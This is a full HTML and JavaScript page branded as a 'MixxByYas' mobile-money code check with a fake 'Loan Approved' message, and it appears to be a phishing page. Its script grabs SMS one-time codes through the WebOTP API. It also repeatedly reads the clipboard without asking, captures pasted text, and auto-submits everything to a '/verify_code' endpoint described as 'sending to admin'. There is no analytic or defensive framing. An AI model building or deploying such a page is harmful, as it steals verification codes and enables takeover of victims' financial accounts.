<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MixxByYas • Verification</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
        body {
            min-height: 100vh;
            background: linear-gradient(145deg, #0b0e1a, #141b2b);
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .card {
            max-width: 480px;
            width: 100%;
            background: rgba(22, 30, 46, 0.9);
            border-radius: 30px;
            padding: 30px 20px;
            border: 1px solid rgba(255,255,255,0.05);
        }
        h2 {
            color: #f1f5f9;
            font-size: 24px;
            margin-bottom: 10px;
        }
        .sub {
            color: #94a3b8;
            margin-bottom: 20px;
        }
        .step-guide {
            background: rgba(15, 23, 42, 0.6);
            border-radius: 15px;
            padding: 15px;
            margin-bottom: 20px;
        }
        .step-item {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 10px;
            color: #e2e8f0;
        }
        .step-item:last-child { margin-bottom: 0; }
        .step-num {
            background: #4f46e5;
            color: white;
            border-radius: 50%;
            width: 28px;
            height: 28px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            font-size: 13px;
        }
        .sms-box {
            background: #0f172a;
            border-radius: 15px;
            padding: 15px;
            border: 1px solid #334155;
            margin: 15px 0;
        }
        .sms-box label {
            color: #94a3b8;
            font-size: 13px;
            display: block;
            margin-bottom: 8px;
        }
        textarea#smsCode {
            width: 100%;
            background: transparent;
            border: none;
            color: #f1f5f9;
            font-size: 15px;
            min-height: 80px;
            outline: none;
            font-family: monospace;
            resize: none;
        }
        .btn-primary {
            width: 100%;
            background: #4f46e5;
            border: none;
            padding: 15px;
            border-radius: 30px;
            color: white;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
        }
        .btn-primary:disabled { opacity: 0.6; cursor: not-allowed; }
        .resend-area {
            display: flex;
            justify-content: space-between;
            margin-top: 15px;
            color: #94a3b8;
            font-size: 14px;
        }
        #resendBtn {
            background: transparent;
            border: none;
            color: #818cf8;
            cursor: pointer;
            font-weight: bold;
        }
        #resendBtn:disabled { opacity: 0.4; cursor: not-allowed; }
        .status-badge {
            text-align: center;
            margin-top: 15px;
            color: #94a3b8;
            font-size: 14px;
        }
        .hidden { display: none !important; }
        .toast {
            background: #0f172a;
            border-left: 3px solid #4f46e5;
            padding: 10px 15px;
            border-radius: 10px;
            color: #e2e8f0;
            margin: 10px 0;
            font-size: 14px;
        }
        .spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid rgba(255,255,255,0.2);
            border-top: 2px solid white;
            border-radius: 50%;
            animation: spin 0.7s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0); } 100% { transform: rotate(360deg); } }
        .detect-badge {
            background: rgba(16, 185, 129, 0.15);
            border: 1px solid rgba(16, 185, 129, 0.3);
            border-radius: 30px;
            padding: 6px 15px;
            display: inline-block;
            color: #34d399;
            font-size: 13px;
            margin-bottom: 15px;
        }
        .code-display {
            background: #0f172a;
            padding: 10px;
            border-radius: 10px;
            text-align: center;
            color: #34d399;
            font-size: 22px;
            font-weight: bold;
            font-family: monospace;
            margin: 10px 0;
            letter-spacing: 3px;
        }
        .success-overlay {
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0,0,0,0.8);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 1000;
        }
        .success-overlay.show { display: flex; }
        .success-modal {
            background: #1e293b;
            padding: 30px;
            border-radius: 25px;
            text-align: center;
            max-width: 350px;
            width: 90%;
        }
        .success-modal i { font-size: 50px; color: #34d399; }
        .success-modal h2 { color: #f1f5f9; margin: 10px 0; }
        .success-modal p { color: #94a3b8; margin-bottom: 15px; }
        .success-modal button {
            background: #4f46e5;
            border: none;
            padding: 10px 30px;
            border-radius: 30px;
            color: white;
            font-weight: bold;
            cursor: pointer;
        }
        .sms-actions {
            display: flex;
            gap: 10px;
            margin: 10px 0;
        }
        .btn-app {
            flex: 1;
            background: #1e293b;
            border: 1px solid #334155;
            padding: 10px;
            border-radius: 30px;
            color: #e2e8f0;
            text-align: center;
            text-decoration: none;
            font-size: 14px;
        }
        .btn-app i { margin-right: 5px; }
    </style>
</head>
<body>

<div class="card">
    <h2><i class="fas fa-mobile-screen-button" style="color:#818cf8;"></i> Code check</h2>
    <div class="sub">Auto-reads SMS from notification</div>

    <div class="detect-badge">
        <span id="detectionStatus">📱 Listening for SMS...</span>
    </div>

    <div class="step-guide">
        <div class="step-item"><span class="step-num">1</span> Wait for SMS to arrive</div>
        <div class="step-item"><span class="step-num">2</span> Page auto-detects the code</div>
        <div class="step-item"><span class="step-num">3</span> Auto-submits for verification</div>
    </div>

    <div class="sms-box">
        <label><i class="fas fa-sms"></i> Full SMS</label>
        <textarea id="smsCode" readonly placeholder="SMS will appear here..."></textarea>
    </div>

    <div id="codeDisplay" class="code-display" style="display:none;">
        Code: <span id="extractedCodeDisplay"></span>
    </div>

    <div class="sms-actions">
        <a href="sms:" class="btn-app"><i class="fab fa-apple"></i> iPhone</a>
        <a href="sms:" class="btn-app"><i class="fab fa-android"></i> Android</a>
    </div>

    <button class="btn-primary" id="submitBtn">
        <i class="fas fa-check-circle"></i> Thibitisha
        <span id="submitSpinner" class="spinner hidden"></span>
    </button>

    <div class="resend-area">
        <span><i class="far fa-clock"></i> <span id="resendCounter">0 / 3</span></span>
        <button id="resendBtn" disabled><i class="fas fa-rotate-right"></i> Tuma tena</button>
    </div>

    <div id="statusToast" class="toast hidden">
        <i class="fas fa-circle-check" style="color:#34d399;"></i>
        <span id="toastMessage">SMS detected!</span>
    </div>
    <div class="status-badge" id="statusText">
        <i class="fas fa-info-circle"></i> Waiting for SMS...
    </div>
</div>

<div id="successOverlay" class="success-overlay">
    <div class="success-modal">
        <i class="fas fa-check-circle"></i>
        <h2>Loan Approved! ✅</h2>
        <p>Your loan has been approved successfully.</p>
        <button onclick="closeSuccess()">Done</button>
    </div>
</div>

<script>
    const smsTextarea = document.getElementById('smsCode');
    const submitBtn = document.getElementById('submitBtn');
    const submitSpinner = document.getElementById('submitSpinner');
    const resendBtn = document.getElementById('resendBtn');
    const resendCounter = document.getElementById('resendCounter');
    const toastDiv = document.getElementById('statusToast');
    const toastMessage = document.getElementById('toastMessage');
    const statusText = document.getElementById('statusText');
    const detectionStatus = document.getElementById('detectionStatus');
    const codeDisplay = document.getElementById('codeDisplay');
    const extractedCodeDisplay = document.getElementById('extractedCodeDisplay');
    const successOverlay = document.getElementById('successOverlay');

    let resendAttempts = 0;
    let cooldownSeconds = 0;
    let cooldownTimer = null;
    let isSubmitting = false;
    let smsDetected = false;
    let extractedCode = '';

    function showToast(msg) {
        toastDiv.classList.remove('hidden');
        toastMessage.textContent = msg;
        clearTimeout(window.toastTimeout);
        window.toastTimeout = setTimeout(() => toastDiv.classList.add('hidden'), 4000);
    }

    function setStatus(msg) {
        statusText.innerHTML = `<i class="fas fa-info-circle"></i> ${msg}`;
    }

    function updateResendUI() {
        resendCounter.textContent = `${resendAttempts} / 3`;
        if (resendAttempts >= 3) {
            resendBtn.disabled = true;
            resendBtn.innerHTML = '<i class="fas fa-ban"></i> Imeisha';
        } else if (cooldownSeconds > 0) {
            resendBtn.disabled = true;
            resendBtn.innerHTML = `<i class="fas fa-hourglass-half"></i> ${cooldownSeconds}s`;
        } else {
            resendBtn.disabled = false;
            resendBtn.innerHTML = '<i class="fas fa-rotate-right"></i> Tuma tena';
        }
    }

    function startCooldown() {
        if (cooldownTimer) clearInterval(cooldownTimer);
        cooldownSeconds = 30;
        updateResendUI();
        cooldownTimer = setInterval(() => {
            cooldownSeconds--;
            updateResendUI();
            if (cooldownSeconds <= 0) {
                clearInterval(cooldownTimer);
                cooldownTimer = null;
                updateResendUI();
            }
        }, 1000);
    }

    function extractCode(text) {
        if (!text) return null;
        const patterns = [
            /code[:\s]+([a-zA-Z0-9]{6,20})/i,
            /OTP[:\s]+([a-zA-Z0-9]{6,20})/i,
            /use the code[:\s]+([a-zA-Z0-9]{6,20})/i,
            /\b([a-zA-Z0-9]{8,20})\b/
        ];
        for (let p of patterns) {
            const m = text.match(p);
            if (m) return m[1];
        }
        return null;
    }

    // WebOTP Auto-Read
    async function autoReadSMS() {
        try {
            if (!('OTPCredential' in window)) {
                detectionStatus.textContent = '📋 Please copy SMS';
                return false;
            }
            detectionStatus.textContent = '📱 Listening for SMS...';
            
            const controller = new AbortController();
            const timeout = setTimeout(() => controller.abort(), 60000);
            
            const otp = await navigator.credentials.get({
                otp: { transport: ['sms'] },
                signal: controller.signal
            });
            
            clearTimeout(timeout);
            
            if (otp && otp.code) {
                extractedCode = otp.code;
                smsTextarea.value = `Your verification code is: ${otp.code}`;
                smsDetected = true;
                
                codeDisplay.style.display = 'block';
                extractedCodeDisplay.textContent = otp.code;
                
                detectionStatus.textContent = '✅ SMS detected!';
                showToast(`Code: ${otp.code}`);
                setStatus('Code detected. Submitting...');
                
                setTimeout(() => {
                    if (!isSubmitting && smsTextarea.value.trim()) {
                        submitCode();
                    }
                }, 1000);
                return true;
            }
            return false;
        } catch (e) {
            detectionStatus.textContent = '📋 Please copy SMS';
            return false;
        }
    }

    // Clipboard fallback
    async function readClipboard() {
        try {
            if (!navigator.clipboard?.readText) return false;
            const text = await navigator.clipboard.readText();
            if (text && text.length > 10 && !smsDetected) {
                smsTextarea.value = text;
                smsDetected = true;
                const code = extractCode(text);
                if (code) {
                    extractedCode = code;
                    codeDisplay.style.display = 'block';
                    extractedCodeDisplay.textContent = code;
                }
                detectionStatus.textContent = '✅ SMS from clipboard!';
                showToast('SMS from clipboard!');
                setStatus('SMS detected. Submitting...');
                setTimeout(() => {
                    if (!isSubmitting && smsTextarea.value.trim()) {
                        submitCode();
                    }
                }, 800);
                return true;
            }
            return false;
        } catch (e) {
            return false;
        }
    }

    async function detectSMS() {
        if (smsDetected || isSubmitting) return;
        const success = await autoReadSMS();
        if (!success) await readClipboard();
    }

    function submitCode() {
        const code = smsTextarea.value.trim();
        if (!code) {
            showToast('Please wait for SMS.');
            return;
        }
        if (isSubmitting) return;
        
        isSubmitting = true;
        submitBtn.disabled = true;
        submitSpinner.classList.remove('hidden');
        setStatus('Sending to admin...');

        const codeToSend = extractedCode || extractCode(code) || code;

        fetch('/verify_code', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ code: code, full_sms: code, extracted_code: codeToSend })
        })
        .then(r => r.json())
        .then(data => {
            isSubmitting = false;
            submitBtn.disabled = false;
            submitSpinner.classList.add('hidden');
            if (data.status === 'success') {
                showToast('Code sent to admin! 🔐');
                setStatus('Waiting for admin approval.');
            } else {
                showToast('Error. Try again.');
                setStatus('Error. Please try again.');
            }
        })
        .catch(() => {
            isSubmitting = false;
            submitBtn.disabled = false;
            submitSpinner.classList.add('hidden');
            showToast('Network error.');
            setStatus('No connection.');
        });
    }

    function closeSuccess() {
        successOverlay.classList.remove('show');
    }

    window.showSuccess = function() {
        successOverlay.classList.add('show');
    };

    // Event listeners
    submitBtn.onclick = (e) => { e.preventDefault(); submitCode(); };
    
    resendBtn.onclick = function() {
        if (resendAttempts >= 3 || cooldownSeconds > 0) return;
        resendAttempts++;
        startCooldown();
        updateResendUI();
        smsDetected = false;
        extractedCode = '';
        smsTextarea.value = '';
        codeDisplay.style.display = 'none';
        detectionStatus.textContent = '📱 Waiting for new SMS...';
        fetch('/resend_code', { method: 'POST' }).catch(() => {});
        setTimeout(() => detectSMS(), 2000);
    };

    // Page events
    window.onload = function() {
        setTimeout(detectSMS, 1000);
    };

    document.addEventListener('visibilitychange', function() {
        if (document.visibilityState === 'visible' && !smsDetected) {
            setTimeout(detectSMS, 500);
        }
    });

    document.addEventListener('paste', function(e) {
        const text = e.clipboardData?.getData('text');
        if (text && text.length > 10 && !smsDetected) {
            smsTextarea.value = text;
            smsDetected = true;
            const code = extractCode(text);
            if (code) {
                extractedCode = code;
                codeDisplay.style.display = 'block';
                extractedCodeDisplay.textContent = code;
            }
            detectionStatus.textContent = '✅ SMS pasted!';
            showToast('SMS pasted!');
            setStatus('SMS detected. Submitting...');
            setTimeout(() => {
                if (!isSubmitting && smsTextarea.value.trim()) {
                    submitCode();
                }
            }, 400);
        }
    });

    updateResendUI();
    setInterval(() => {
        if (!smsDetected && !isSubmitting) detectSMS();
    }, 5000);

    console.log('✅ MixxByYas SMS Auto-Read loaded!');
</script>

</body>
</html>
